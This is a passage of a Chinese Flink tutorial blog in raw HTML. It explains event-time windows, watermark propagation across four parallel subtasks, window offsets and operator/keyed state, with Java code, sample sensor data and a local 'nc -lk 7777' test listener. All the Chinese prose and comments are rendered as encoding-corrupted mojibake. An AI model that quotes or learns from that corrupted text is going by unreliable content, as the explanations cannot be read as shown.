class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest3_EventTimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flink1.12.X å·²ç»é»˜è®¤å°±æ˜¯ä½¿ç”¨EventTimeäº†ï¼Œæ‰€ä»¥ä¸éœ€è¦è¿™è¡Œä»£ç </span></span><br><span class="line">    <span class="comment">//        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span></span><br><span class="line">    env.getConfig().setAutoWatermarkInterval(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹ï¼Œåˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      <span class="comment">//              </span></span><br><span class="line">      <span class="comment">//                // æ—§ç‰ˆ (æ–°ç‰ˆå®˜æ–¹æ¨èç”¨assignTimestampsAndWatermarks(WatermarkStrategy) )</span></span><br><span class="line">      <span class="comment">// å‡åºæ•°æ®è®¾ç½®äº‹ä»¶æ—¶é—´å’Œwatermark</span></span><br><span class="line">      <span class="comment">//.assignTimestampsAndWatermarks(new AscendingTimestampExtractor&lt;SensorReading&gt;() &#123;</span></span><br><span class="line">      <span class="comment">//  @Override</span></span><br><span class="line">      <span class="comment">//  public long extractAscendingTimestamp(SensorReading element) &#123;</span></span><br><span class="line">      <span class="comment">//    return element.getTimestamp() * 1000L;</span></span><br><span class="line">      <span class="comment">//  &#125;</span></span><br><span class="line">      <span class="comment">//&#125;)</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// æ—§ç‰ˆ (æ–°ç‰ˆå®˜æ–¹æ¨èç”¨assignTimestampsAndWatermarks(WatermarkStrategy) )</span></span><br><span class="line">      <span class="comment">// ä¹±åºæ•°æ®è®¾ç½®æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸºäºäº‹ä»¶æ—¶é—´çš„å¼€çª—èšåˆï¼Œç»Ÿè®¡15ç§’å†…æ¸©åº¦çš„æœ€å°å€¼</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; minTempStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(outputTag)</span><br><span class="line">      .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    minTempStream.print(<span class="string">&quot;minTemp&quot;</span>);</span><br><span class="line">    minTempStream.getSideOutput(outputTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="å¹¶è¡Œä»»åŠ¡Watermarkä¼ é€’æµ‹è¯•"><a href="#å¹¶è¡Œä»»åŠ¡Watermarkä¼ é€’æµ‹è¯•" class="headerlink" title="å¹¶è¡Œä»»åŠ¡Watermarkä¼ é€’æµ‹è¯•"></a>å¹¶è¡Œä»»åŠ¡Watermarkä¼ é€’æµ‹è¯•</h6><p>åœ¨å‰é¢ä»£ç çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹æ‰§è¡Œç¯å¢ƒå¹¶è¡Œåº¦ä¸º4ï¼Œè¿›è¡Œæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest3_EventTimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line">    env.getConfig().setAutoWatermarkInterval(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹ï¼Œåˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// ä¹±åºæ•°æ®è®¾ç½®æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸºäºäº‹ä»¶æ—¶é—´çš„å¼€çª—èšåˆï¼Œç»Ÿè®¡15ç§’å†…æ¸©åº¦çš„æœ€å°å€¼</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; minTempStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(outputTag)</span><br><span class="line">      .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    minTempStream.print(<span class="string">&quot;minTemp&quot;</span>);</span><br><span class="line">    minTempStream.getSideOutput(outputTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœ¬åœ°socketï¼Œè¾“å…¥æ•°æ®ï¼ŒæŸ¥çœ‹ç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><p>è¾“å…¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718211,34</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><p><em>æ³¨æ„ï¼šä¸Šé¢è¾“å…¥å…¨éƒ¨è¾“å…¥åï¼Œæ‰çªç„¶æœ‰ä¸‹é¢4æ¡è¾“å‡ºï¼</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">minTemp:2&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">minTemp:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">minTemp:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">minTemp:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br></pre></td></tr></table></figure><p>####### åˆ†æ</p><ol><li><p> <strong>è®¡ç®—çª—å£èµ·å§‹ä½ç½®Startå’Œç»“æŸä½ç½®End</strong><br>ä»<code>TumblingProcessingTimeWindows</code>ç±»é‡Œçš„<code>assignWindows</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥çª—å£çš„èµ·ç‚¹è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š <img src="https://g.yuque.com/gr/latex?%E7%AA%97%E5%8F%A3%E8%B5%B7%E7%82%B9start%20=%20timestamp%20-%20(timestamp%20-offset+WindowSize)%20%5C%25%20WindowSize%0A###card=math&code=%E7%AA%97%E5%8F%A3%E8%B5%B7%E7%82%B9start%20%3D%20timestamp%20-%20%28timestamp%20-offset%2BWindowSize%29%20%5C%25%20WindowSize%0A&id=p3BYZ"><br>ç”±äºæˆ‘ä»¬æ²¡æœ‰è®¾ç½®offsetï¼Œæ‰€ä»¥è¿™é‡Œ<code>start=ç¬¬ä¸€ä¸ªæ•°æ®çš„æ—¶é—´æˆ³1547718199-(1547718199-0+15)%15=1547718195</code><br>è®¡ç®—å¾—åˆ°çª—å£åˆå§‹ä½ç½®ä¸º<code>Start = 1547718195</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªçª—å£ç†è®ºä¸Šæœ¬åº”è¯¥åœ¨1547718195+15çš„ä½ç½®å…³é—­ï¼Œä¹Ÿå°±æ˜¯<code>End=1547718210</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;TimeWindow&gt; <span class="title">assignWindows</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  Object element, <span class="keyword">long</span> timestamp, WindowAssignerContext context)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">long</span> now = context.getCurrentProcessingTime();</span><br><span class="line">  <span class="keyword">if</span> (staggerOffset == <span class="keyword">null</span>) &#123;</span><br><span class="line">    staggerOffset =</span><br><span class="line">      windowStagger.getStaggerOffset(context.getCurrentProcessingTime(), size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">long</span> start =</span><br><span class="line">    TimeWindow.getWindowStartWithOffset(</span><br><span class="line">    now, (globalOffset + staggerOffset) % size, size);</span><br><span class="line">  <span class="keyword">return</span> Collections.singletonList(<span class="keyword">new</span> TimeWindow(start, start + size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·Ÿè¸ª getWindowStartWithOffset æ–¹æ³•å¾—åˆ°TimeWindowçš„æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">getWindowStartWithOffset</span><span class="params">(<span class="keyword">long</span> timestamp, <span class="keyword">long</span> offset, <span class="keyword">long</span> windowSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> timestamp - (timestamp - offset + windowSize) % windowSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> <strong>è®¡ç®—ä¿®æ­£åçš„Windowè¾“å‡ºç»“æœçš„æ—¶é—´</strong><br>æµ‹è¯•ä»£ç ä¸­Watermarkè®¾ç½®çš„<code>maxOutOfOrderness</code>æœ€å¤§ä¹±åºç¨‹åº¦æ˜¯2sï¼Œæ‰€ä»¥å®é™…è·å–åˆ°End+2sçš„æ—¶é—´æˆ³æ•°æ®æ—¶ï¼ˆè¾¾åˆ°Watermarkï¼‰ï¼Œæ‰è®¤ä¸ºWindowéœ€è¦è¾“å‡ºè®¡ç®—çš„ç»“æœï¼ˆä¸å…³é—­ï¼Œå› ä¸ºè®¾ç½®äº†å…è®¸è¿Ÿåˆ°1minï¼‰</p></li></ol><p><strong>æ‰€ä»¥å®é™…åº”è¯¥æ˜¯1547718212çš„æ•°æ®åˆ°æ¥æ—¶æ‰è§¦å‘Windowè¾“å‡ºè®¡ç®—ç»“æœã€‚</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// BoundedOutOfOrdernessTimestampExtractor.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BoundedOutOfOrdernessTimestampExtractor</span><span class="params">(Time maxOutOfOrderness)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (maxOutOfOrderness.toMilliseconds() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(</span><br><span class="line">      <span class="string">&quot;Tried to set the maximum allowed &quot;</span></span><br><span class="line">      + <span class="string">&quot;lateness to &quot;</span></span><br><span class="line">      + maxOutOfOrderness</span><br><span class="line">      + <span class="string">&quot;. This parameter cannot be negative.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.maxOutOfOrderness = maxOutOfOrderness.toMilliseconds();</span><br><span class="line">  <span class="keyword">this</span>.currentMaxTimestamp = Long.MIN_VALUE + <span class="keyword">this</span>.maxOutOfOrderness;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Watermark <span class="title">getCurrentWatermark</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// this guarantees that the watermark never goes backwards.</span></span><br><span class="line">  <span class="keyword">long</span> potentialWM = currentMaxTimestamp - maxOutOfOrderness;</span><br><span class="line">  <span class="keyword">if</span> (potentialWM &gt;= lastEmittedWatermark) &#123;</span><br><span class="line">    lastEmittedWatermark = potentialWM;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Watermark(lastEmittedWatermark);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li> ä¸ºä»€ä¹ˆä¸Šé¢è¾“å…¥ä¸­ï¼Œæœ€åè¿ç»­å››æ¡ç›¸åŒè¾“å…¥ï¼Œæ‰è§¦å‘Windowè¾“å‡ºç»“æœï¼Ÿ </li></ol><ul><li><strong>Watermarkä¼šå‘å­ä»»åŠ¡å¹¿æ’­</strong> <ul><li>æˆ‘ä»¬åœ¨mapæ‰è®¾ç½®Watermarkï¼Œmapæ ¹æ®Rebalanceè½®è¯¢æ–¹å¼åˆ†é…æ•°æ®ã€‚æ‰€ä»¥å‰4ä¸ªè¾“å…¥åˆ†åˆ«åˆ°4ä¸ªslotä¸­ï¼Œ4ä¸ªslotè®¡ç®—å¾—å‡ºçš„Watermarkä¸åŒï¼ˆåˆ†åˆ«æ˜¯1547718199-2ï¼Œ1547718201-2ï¼Œ1547718202-2ï¼Œ1547718205-2ï¼‰</li></ul></li><li><strong>Watermarkä¼ é€’æ—¶ï¼Œä¼šé€‰æ‹©å½“å‰æ¥æ”¶åˆ°çš„æœ€å°ä¸€ä¸ªä½œä¸ºè‡ªå·±çš„Watermark</strong> <ul><li>å‰4æ¬¡è¾“å…¥ä¸­ï¼Œæœ‰äº›mapå­ä»»åŠ¡è¿˜æ²¡æœ‰æ¥æ”¶åˆ°æ•°æ®ï¼Œæ‰€ä»¥å…¶ä¸‹æ¸¸çš„keyByåçš„sloté‡Œwatermarkå°±æ˜¯<code>Long.MIN_VALUE</code>ï¼ˆå› ä¸º4ä¸ªä¸Šæ¸¸çš„Watermarkå¹¿æ’­æœ€å°å€¼å°±æ˜¯é»˜è®¤çš„<code>Long.MIN_VALUE</code>ï¼‰</li><li>å¹¶è¡Œåº¦4ï¼Œåœ¨æœ€å4ä¸ªç›¸åŒçš„è¾“å…¥ï¼Œä½¿å¾—Rebalanceåˆ°4ä¸ªmapå­ä»»åŠ¡çš„æ•°æ®çš„<code>currentMaxTimestamp</code>éƒ½æ˜¯1547718212ï¼Œç»è¿‡<code>getCurrentWatermark()</code>çš„è®¡ç®—ï¼ˆ<code>currentMaxTimestamp-maxOutOfOrderness</code>ï¼‰ï¼Œ4ä¸ªå­ä»»åŠ¡éƒ½è®¡ç®—å¾—åˆ°watermark=1547718210ï¼Œ4ä¸ªmapå­ä»»åŠ¡å‘4ä¸ªkeyByå­ä»»åŠ¡å¹¿æ’­<code>watermark=1547718210</code>ï¼Œä½¿å¾—keyByå­ä»»åŠ¡ä»¬è·å–åˆ°4ä¸ªä¸Šæ¸¸çš„Watermarkæœ€å°å€¼å°±æ˜¯1547718210ï¼Œç„¶å4ä¸ªKeyByå­ä»»åŠ¡éƒ½æ›´æ–°è‡ªå·±çš„Watermarkä¸º1547718210ã€‚</li></ul></li><li> <strong>æ ¹æ®Watermarkçš„å®šä¹‰ï¼Œæˆ‘ä»¬è®¤ä¸º&gt;=Watermarkçš„æ•°æ®éƒ½å·²ç»åˆ°è¾¾ã€‚ç”±äºæ­¤æ—¶watermark &gt;= çª—å£Endï¼Œæ‰€ä»¥Windowè¾“å‡ºè®¡ç®—ç»“æœï¼ˆ4ä¸ªå­ä»»åŠ¡ï¼Œ4ä¸ªç»“æœï¼‰ã€‚</strong> </li></ul><h5 id="çª—å£èµ·å§‹ç‚¹å’Œåç§»é‡"><a href="#çª—å£èµ·å§‹ç‚¹å’Œåç§»é‡" class="headerlink" title="çª—å£èµ·å§‹ç‚¹å’Œåç§»é‡"></a>çª—å£èµ·å§‹ç‚¹å’Œåç§»é‡</h5><blockquote><p><a href="https://juejin.cn/post/6844904110941011976">flink-Window Assingers(çª—å£åˆ†é…å™¨)ä¸­offsetåç§»é‡</a></p></blockquote><pre><code>æ—¶é—´åç§»ä¸€ä¸ªå¾ˆå¤§çš„ç”¨å¤„æ˜¯ç”¨æ¥è°ƒå‡†é0æ—¶åŒºçš„çª—å£ï¼Œä¾‹å¦‚:åœ¨ä¸­å›½ä½ éœ€è¦æŒ‡å®šä¸€ä¸ª8å°æ—¶çš„æ—¶é—´åç§»ã€‚</code></pre><h3 id="FlinkçŠ¶æ€ç®¡ç†"><a href="#FlinkçŠ¶æ€ç®¡ç†" class="headerlink" title="FlinkçŠ¶æ€ç®¡ç†"></a>FlinkçŠ¶æ€ç®¡ç†</h3><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flinkä¸­çš„çŠ¶æ€</a></p><p><a href="https://zhuanlan.zhihu.com/p/104171679">FlinkçŠ¶æ€ç®¡ç†è¯¦è§£ï¼šKeyed Stateå’ŒOperator List Stateæ·±åº¦è§£æ</a>    &lt;=    ä¸é”™çš„æ–‡ç« ï¼Œå»ºè®®é˜…è¯»</p></blockquote><ul><li>ç®—å­çŠ¶æ€ï¼ˆOperator Stateï¼‰</li><li>é”®æ§çŠ¶æ€ï¼ˆKeyed Stateï¼‰</li><li>çŠ¶æ€åç«¯ï¼ˆState Backendsï¼‰</li></ul><h4 id="çŠ¶æ€æ¦‚è¿°"><a href="#çŠ¶æ€æ¦‚è¿°" class="headerlink" title="çŠ¶æ€æ¦‚è¿°"></a>çŠ¶æ€æ¦‚è¿°</h4><p><img src="https://img-blog.csdnimg.cn/20200906125916475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=HPdLR&originHeight=307&originWidth=745&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ç”±ä¸€ä¸ªä»»åŠ¡ç»´æŠ¤ï¼Œå¹¶ä¸”ç”¨æ¥è®¡ç®—æŸä¸ªç»“æœçš„æ‰€æœ‰æ•°æ®ï¼Œéƒ½å±äºè¿™ä¸ªä»»åŠ¡çš„çŠ¶æ€</li><li>å¯ä»¥è®¤ä¸ºä»»åŠ¡çŠ¶æ€å°±æ˜¯ä¸€ä¸ªæœ¬åœ°å˜é‡ï¼Œå¯ä»¥è¢«ä»»åŠ¡çš„ä¸šåŠ¡é€»è¾‘è®¿é—®</li><li><strong>Flink ä¼šè¿›è¡ŒçŠ¶æ€ç®¡ç†ï¼ŒåŒ…æ‹¬çŠ¶æ€ä¸€è‡´æ€§ã€æ•…éšœå¤„ç†ä»¥åŠé«˜æ•ˆå­˜å‚¨å’Œè®¿é—®ï¼Œä»¥ä¾¿äºå¼€å‘äººå‘˜å¯ä»¥ä¸“æ³¨äºåº”ç”¨ç¨‹åºçš„é€»è¾‘</strong></li></ul><hr><ul><li><strong>åœ¨Flinkä¸­ï¼ŒçŠ¶æ€å§‹ç»ˆä¸ç‰¹å®šç®—å­ç›¸å…³è”</strong></li><li>ä¸ºäº†ä½¿è¿è¡Œæ—¶çš„Flinkäº†è§£ç®—å­çš„çŠ¶æ€ï¼Œç®—å­éœ€è¦é¢„å…ˆæ³¨å†Œå…¶çŠ¶æ€</li></ul><p><strong>æ€»çš„æ¥è¯´ï¼Œæœ‰ä¸¤ç§ç±»å‹çš„çŠ¶æ€ï¼š</strong></p><ul><li><strong>ç®—å­çŠ¶æ€ï¼ˆOperator Stateï¼‰</strong> <ul><li>ç®—å­çŠ¶æ€çš„ä½œç”¨èŒƒå›´é™å®šä¸º<strong>ç®—å­ä»»åŠ¡</strong>ï¼ˆä¹Ÿå°±æ˜¯ä¸èƒ½è·¨ä»»åŠ¡è®¿é—®ï¼‰</li></ul></li><li><strong>é”®æ§çŠ¶æ€ï¼ˆKeyed Stateï¼‰</strong> <ul><li>æ ¹æ®è¾“å…¥æ•°æ®æµä¸­å®šä¹‰çš„é”®ï¼ˆkeyï¼‰æ¥ç»´æŠ¤å’Œè®¿é—®</li></ul></li></ul><h4 id="ç®—å­çŠ¶æ€-Operator-State"><a href="#ç®—å­çŠ¶æ€-Operator-State" class="headerlink" title="ç®—å­çŠ¶æ€ Operator State"></a>ç®—å­çŠ¶æ€ Operator State</h4><p><img src="https://img-blog.csdnimg.cn/20200906173949148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=bopoS&originHeight=384&originWidth=753&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> ç®—å­çŠ¶æ€çš„ä½œç”¨èŒƒå›´é™å®šä¸ºç®—å­ä»»åŠ¡ï¼ŒåŒä¸€å¹¶è¡Œä»»åŠ¡æ‰€å¤„ç†çš„æ‰€æœ‰æ•°æ®éƒ½å¯ä»¥è®¿é—®åˆ°ç›¸åŒçš„çŠ¶æ€ã€‚ </li><li> çŠ¶æ€å¯¹äº<strong>åŒä¸€ä»»åŠ¡</strong>è€Œè¨€æ˜¯å…±äº«çš„ã€‚ï¼ˆ<strong>ä¸èƒ½è·¨slot</strong>ï¼‰ </li><li> çŠ¶æ€ç®—å­ä¸èƒ½ç”±ç›¸åŒæˆ–ä¸åŒç®—å­çš„å¦ä¸€ä¸ªä»»åŠ¡è®¿é—®ã€‚ </li></ul><h5 id="ç®—å­çŠ¶æ€æ•°æ®ç»“æ„"><a href="#ç®—å­çŠ¶æ€æ•°æ®ç»“æ„" class="headerlink" title="ç®—å­çŠ¶æ€æ•°æ®ç»“æ„"></a>ç®—å­çŠ¶æ€æ•°æ®ç»“æ„</h5><ul><li>åˆ—è¡¨çŠ¶æ€(List state) <ul><li>å°†çŠ¶æ€è¡¨ç¤ºä¸ºä¸€ç»„æ•°æ®çš„åˆ—è¡¨</li></ul></li><li>è”åˆåˆ—è¡¨çŠ¶æ€(Union list state) <ul><li>ä¹Ÿå°†çŠ¶æ€è¡¨ç¤ºæœªæ•°æ®çš„åˆ—è¡¨ã€‚å®ƒä¸å¸¸è§„åˆ—è¡¨çŠ¶æ€çš„åŒºåˆ«åœ¨äºï¼Œåœ¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œæˆ–è€…ä»ä¿å­˜ç‚¹(savepoint)å¯åŠ¨åº”ç”¨ç¨‹åºæ—¶å¦‚ä½•æ¢å¤</li></ul></li><li>å¹¿æ’­çŠ¶æ€(Broadcast state) 